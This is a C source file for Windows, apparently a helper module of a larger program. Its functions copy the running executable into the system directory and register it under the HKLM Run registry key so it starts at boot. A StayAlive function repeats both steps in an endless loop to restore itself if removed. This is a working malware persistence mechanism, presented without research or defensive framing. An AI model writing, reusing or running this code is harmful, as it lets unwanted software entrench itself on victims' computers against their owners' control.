#include "Tools.h"
#include "Constants.h"
#include "Debugger.h"

#include <io.h>

BOOL FileExist(CONST PTCHAR filename)
{
	INT code = _taccess(filename, 0); // Checks for existence only - (mode = 0)
	if (code == 0)
		return TRUE;
	else
		switch (errno)
		{
		case EACCES:
			_tprintf(TEXT("Access denied: the file's permission setting does not allow specified access.\n"));
			break;

		case ENOENT:
			_tprintf(TEXT("File name or path not found.\n"));
			break;

		case EINVAL:
			_tprintf(TEXT("Invalid parameter.\n"));
			break;

		default:
			_tprintf(TEXT("Unknown error.\n"));
			break;
		}

	return FALSE;
}

BOOL Copy2Sysdir(CONST PTCHAR appname)
{
	HMODULE hModule = NULL;
	if(!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, NULL, &hModule))
	{
		PrintError(TEXT("GetModuleHandleEx"), GetLastError());

		return FALSE;
	}

	TCHAR filepath[SMALL_BUFFER_LENGTH] = { 0 };
	if (!GetModuleFileName(hModule, filepath, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXT("GetModuleFileName"), GetLastError());

		return FALSE;
	}

	TCHAR filename[SMALL_BUFFER_LENGTH] = TEXT("\\");
	errno_t code = _tcscat_s(filename, SMALL_BUFFER_LENGTH, appname);
	if (code != 0)
	{
		_tprintf(TEXT("Cannot construct filename, error: %d"), code);

		return FALSE;
	}

	TCHAR sysdir[SMALL_BUFFER_LENGTH] = { 0 };
	if (!GetSystemDirectory(sysdir, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXT("GetSystemDirectory"), GetLastError());

		return FALSE;
	}

	code = _tcscat_s(sysdir, SMALL_BUFFER_LENGTH, filename);
	if (code != 0)
	{
		_tprintf(TEXT("Cannot construct sysdir path, error: %d"), code);

		return FALSE;
	}

	// _tprintf(TEXT("filepath:%s, sysdir:%s\n"), filepath, sysdir);
	if(!FileExist(sysdir))
		if (!CopyFileEx(filepath, sysdir, NULL, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS))
		{
			PrintError(TEXT("CopyFile"), GetLastError());

			return FALSE;
		}                        

	return TRUE;
}

BOOL SaveInReg(CONST PTCHAR appname)
{
	TCHAR filename[SMALL_BUFFER_LENGTH] = TEXT("\\");
	errno_t code = _tcscat_s(filename, SMALL_BUFFER_LENGTH, appname);
	if (code != 0)
	{
		_tprintf(TEXT("Cannot construct filename, error: %d"), code);

		return FALSE;
	}

	TCHAR sysdir[SMALL_BUFFER_LENGTH] = { 0 };
	if (!GetSystemDirectory(sysdir, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXT("GetSystemDirectory"), GetLastError());

		return FALSE;
	}

	code = _tcscat_s(sysdir, SMALL_BUFFER_LENGTH, filename);
	if (code != 0)
	{
		_tprintf(TEXT("Cannot construct sysdir path, error: %d"), code);

		return FALSE;
	}

	HKEY hKey = NULL;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0ul, KEY_WRITE, &hKey) != ERROR_SUCCESS)
	{
		PrintError(TEXT("RegOpenKeyEx"), GetLastError());

		return FALSE;
	}

	if (RegSetValueEx(hKey, appname, 0ul, REG_EXPAND_SZ, (BYTE*)sysdir, SMALL_BUFFER_LENGTH) != ERROR_SUCCESS)
	{
		PrintError(TEXT("RegSetValueEx"), GetLastError());
		if (RegCloseKey(hKey) != ERROR_SUCCESS)
			PrintError(TEXT("RegCloseKey"), GetLastError());

		return FALSE;
	}

	if (RegCloseKey(hKey) != ERROR_SUCCESS)
	{
		PrintError(TEXT("RegCloseKey"), GetLastError());

		return FALSE;
	}

	return TRUE;
}

VOID StayAlive(CONST PTCHAR appname)
{
	while (TRUE)
	{
		Copy2Sysdir(appname);
		SaveInReg(appname);
	}
}

VOID SafeFree(LPVOID ptr)
{
	if (ptr)
	{
		free(ptr);

		ptr = NULL;
	}
}